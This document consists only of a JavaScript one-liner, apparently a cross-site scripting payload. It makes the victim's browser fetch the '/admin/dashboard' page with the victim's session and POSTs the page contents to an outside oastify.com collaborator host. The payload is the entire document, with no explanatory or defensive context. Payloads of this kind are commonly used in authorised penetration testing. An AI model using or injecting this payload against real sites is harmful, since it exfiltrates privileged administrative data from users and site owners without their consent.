fetch('/admin/dashboard').then(r=>r.text()).then(d=>fetch('https://wqq2rku9lbnph14jj3aavnu970dr7fy3n.oastify.com',{method:'POST',body:d}))
